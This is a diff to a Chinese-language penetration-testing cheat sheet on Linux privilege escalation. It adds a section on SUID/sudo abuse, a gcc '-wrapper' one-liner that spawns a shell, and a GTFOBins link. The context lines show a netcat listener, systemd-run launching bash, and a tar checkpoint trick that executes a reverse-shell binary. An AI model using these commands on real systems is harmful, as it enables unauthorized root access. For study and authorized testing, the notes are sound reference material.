@@ -114,7 +114,9 @@ nc -lvnp port | tee result.txt  # tee命令将数据分流，同时输出到标�
 less -r result.txt
 ```
 
-## SUID提权
+## SUID/sudo提权
+
+如果一个程序有SUID位, 或者可以sudo运行, 那么我们可以尝试利用它们提权
 
 ### 查找所有具有SUID位的文件
 
@@ -192,6 +194,15 @@ systemd-run -S
 
 ```shell
 systemd-run -t /bin/bash
+```
+
+### gcc提权
+
+`-wrapper` 选项让 gcc 调用内部子程序时经过一个“包装程序”。逗号前是程序，逗号后是程序的参数, -s意思是从stdin读取命令、逐行执行  
+`.` 可以是任意存在的文件/目录
+
+```shell
+gcc -wrapper /bin/sh,-s .
 ```
 
 ## 服务漏洞提权
@@ -414,3 +425,7 @@ tar czf /tmp/backup.tar.gz --checkpoint=1 --checkpoint-action=exec=shell.elf 其
 `--checkpoint=1`: 指示`tar`每处理1条记录就触发一次“检查点”。
 `--checkpoint-action=exec=shell.elf`: 指定在每次触发检查点时。执行(`exec`)指定的程序，即`shell.elf`  
 所以`tar`就会在归档文件时触发检查点，执行shell.elf，反弹回一个shell。
+
+## 工具网站
+
+[GTFOBins](https://gtfobins.org/) 收集了许多类Unix可执行文件提权方式
